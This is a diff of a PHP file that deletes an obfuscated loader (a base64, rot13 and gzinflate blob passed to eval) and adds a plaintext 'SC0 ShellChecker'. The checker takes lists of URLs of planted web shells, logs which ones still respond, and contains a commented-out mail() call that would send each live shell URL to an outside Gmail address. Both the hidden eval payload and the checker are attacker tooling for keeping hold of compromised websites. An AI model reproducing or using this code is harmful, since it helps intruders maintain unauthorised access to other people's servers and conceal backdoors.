@@ -1,4 +1,76 @@
-<?php 
-$pasirmerah = "vUh6Yts2EP5hIP/hrAa1A2ux0iId5hetWG4X+0WkXjEMZgKDFFUqsVRWJ5OzFOS/91XLipysH/YlUxzz5Z67515rh5nhEFmk2pQIdxPj9CZDuEnDWcqbIDrpnCNGb0ZLLGZruLe5MqMPbhivxwbt1qjRO79sJE6ZpKlv8JDqebcVPG756Fr6ZmsZXo4zXmUxujdJ4TjlIlQxgotrDZKXNoc3bhiOIdZsYdlp9IHOW9+W6pHhaiiODXFuTaRSesApZboIMhltl8iBVlMeoGOrgjMFhc5j2rvmibAobc2x1zDtbI69dW/eUp+0tKJPoQ1Vg3IJ1wazHYrJkC4nUIdl6JTnG1W3NT4tiVytSEfAZ+UiTYgqI2Ty8CYAnSnLGZ3Suk9ya0HrmFjl433SAZi4DHWBGrJFWFbXQlYgQ600ESV6yK6cXlxcguD3tAiJ2QEdWkXnNuk7/E0WJ6pEuo8q6ajzQfvKqicD88P+QZeJO/iGJWqR2mh4qi4KooqC8VanVZj3C7aoSVOpayVDxpxWXHI8x/6pMlWMz+DBMQE4NaipDiRZ94j9rhEb10VFdpU4ISInlegfYMvwaQC/DOB9IxmTQ6wF2SP8Cz2G4lgCuI5Yx6Y36g0Isuy5897tkZjznlH9mszUSraAfsNzCkf2jSsebHSlSFw44He+mP2+mC2D2eLvq8+L1ZevX3Tz4KDIWP+b5FZWsoGvrBHUZyF1C/nKbSHTFmSkukvFd9M4fMTKfT5J2pb9QDO9qzTLtNTs49adnXS8CgY1l8He3ExY+XCLyr2gdJHMHOUD1WYIQTpUfAtQ1wWPkfUDUI+nPEp4UhYCHbT1Fl5Mn8QHQooHQNktCdmcnLUxa3VGgrN61H6x3wQii37DKoF4voP6Xbrn71LhJ5h1MAILqt+AVbfou8rXgqpiuqJ0y2nRs/vJ0D8hGFMHNx8BWInPV+HyTCn8mKtiDnsrNZysODz86U0U0yXMRLgetxCCd8k51H0Nj44q+X/nTeoq1uY1ki0wj66EhtdX91aH/ly6rZSo+qerQkrzz8vevjFF23VoM3cWstVgXLzI4xpAFpomRgN8QmgILYTe9A/+Rj9SnRkqsL1TLfe6jyrMF6DvdV13D8HLJ/+DHhxrQ/Afj7z+qSPvg2OI/x+WTHZctJsou/gQ4ko//sTT//YgpUfRGFoj8T4LZswh3YC0eacFp4k/Q3MNFY1awSn+Av5PkcTJDt7CfMMyUFPsP2HQpkGrsooG+bJ7C62JPGJCcaBYGntezg0lo6oy+g4=	";
-eval(str_rot13(gzinflate(str_rot13(base64_decode(($pasirmerah))))));
+<?php echo "<style type=\"text/css\">
+.entryfield {width:400px;height:150px;}
+.subbtn {background:#b70505;color:white;border: 1px solid #000; padding:6px 6px 6px 6px;}
+.subbtn:hover {background:#c0bfbf;color:#000000;}
+
+.image {
+    width: 250px;
+    height: 250px;
+    -webkit-animation:spin 8s linear infinite;
+    -moz-animation:spin 8s linear infinite;
+    animation:spin 8s linear infinite;
+}
+@-moz-keyframes spin { 100% { -moz-transform: rotate(-360deg); } }
+@-webkit-keyframes spin { 100% { -webkit-transform: rotate(-360deg); } }
+@keyframes spin { 100% { -webkit-transform: rotate(-360deg); transform:rotate(-360deg); } }
+
+
+</style>
+
+<font face='Ubuntu'>
+<center><img class='image' src='sc0.png' width='220' height='220'>
+<p>
+<body bgcolor='black'>
+<form name=\"frmcontadd\" action=\"\" method=\"post\">
+
+  <textarea class=\"entryfield\" name=\"url\" cols=115 rows=10></textarea><br>
+  <br>
+  <input class=\"subbtn\" type=\"submit\" name=\"Submit\" value=\"  >  \">
+
+</form>";
+function get_http_response_code($theurl) {
+    $headers = get_headers($theurl);
+    $status = substr($headers[0], 9, 3);
+    $p = parse_url($theurl);
+    $host = explode(':', $p['host']);
+    $hostname = $host[0];
+    if ($status == 200) {
+        $visitor = $_SERVER["REMOTE_ADDRS"];
+        $judul = "shell: $theurl ";
+        $body = "shell: $theurl";
+        if (!empty($theurl)) {
+/// I hate myself go delete this line            @mail("anakmancasan@gmail.com", $judul, $body);
+        }
+        $writeuRl = $theurl . "
+";
+        $fh = fopen("hasil.txt", "a");
+        fwrite($fh, $writeuRl, strlen($writeuRl));
+        echo "<strong><font color=Green>OK</font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
+    } elseif ($status == 500) {
+        echo "<strong><font color=black>" . $status . " 500</font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
+    } else {
+        $writeuRl = $theurl . "
+";
+        $fh = fopen("sampah.txt", "a");
+        fwrite($fh, $writeuRl, strlen($writeuRl));
+        echo "<strong><font color=red>Not Found</font></strong> - <i><a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</i></a><br />";
+    }
+}
+if (isset($_POST['Submit'])) {
+    $hosts = explode("
+", $_POST['url']);
+    $values = array();
+    foreach ($hosts as $host) {
+        if ($host != "") {
+            @get_http_response_code("$host");
+        }
+    }
+    
+}
 ?>
+
+<br>
+<br>
+<font color='gray'><i><b>Even in the deep of darkness, 0ur eyes still shine.</i></b>
+<title>[!] SC0 ShellChecker [!]</title>
+</html>
